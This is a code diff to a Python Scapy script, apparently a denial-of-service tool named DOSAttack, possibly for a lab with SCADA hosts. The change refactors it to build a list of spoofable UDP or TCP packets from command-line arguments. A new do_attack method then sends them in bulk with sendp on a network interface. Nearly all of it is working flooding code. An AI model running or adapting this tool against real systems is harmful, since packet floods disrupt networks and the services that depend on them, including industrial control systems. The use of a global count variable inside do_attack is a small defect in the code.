@@ -88,7 +88,8 @@ class DOSAttack:
         
         if src_port == None:
             src_port = self.random_port()
-
+        else:
+            src_port = int(src_port)
             
         print(src, src_mac, src_port)
 
@@ -141,7 +142,7 @@ class DOSAttack:
                   UDP(dport=dst_port,
                       sport=src_port)/\
                   Raw(load=load)
-            print(len(load))
+            #print(len(load))
             pkt.show2()
         
         else:
@@ -154,12 +155,12 @@ class DOSAttack:
                   TCP(dport=dst_port,
                       sport=src_port)/\
                   Raw(load=load)
-            print(len(load))
+            #print(len(load))
             pkt.show2()
-        
-        cnt = int(cnt)
-        inter = int(inter)
-        sendp(pkt, iface="eth2", count=cnt, inter=inter)
+        return pkt
+    def do_attack(self,pkts,inter):       
+        inter = float(inter)
+        sendp(pkts, iface="eth2", count=cnt, inter=inter)
 
 if __name__ == "__main__":
     
@@ -176,8 +177,14 @@ if __name__ == "__main__":
     args = parser.parse_args() 
 
     attack = DOSAttack()
+    cnt = int(args.count)
+    pkts=[]
+    for i in range(cnt):
+        pkt=attack.create_ip(src_ip = args.src_ip, dst_ip = args.dst_ip, src_port = args.src_port, dst_port = args.dst_port, tran_l_proto = args.trans_proto, pkt_len = args.len, inter = args.interval, cnt = args.count)
+        pkts.append(pkt)
+    attack.do_attack(pkts,args.interval)
+
     # pkt = attack.create_attack_pkts(src_list=["mini3", "mini2"], target_list=["scada1", "scada2"], pkt_len=100, inter=1)
-    attack.create_ip(src_ip = args.src_ip, dst_ip = args.dst_ip, src_port = args.src_port, dst_port = args.dst_port, tran_l_proto = args.trans_proto, pkt_len = args.len, inter = args.interval, cnt = args.count)
 
     # attack.create_ip(src_ip = "mini1", dst_ip= "12.32.21.12", src_port = 10023, dst_port = 456, tran_l_proto = "TCP", cnt=10)
 
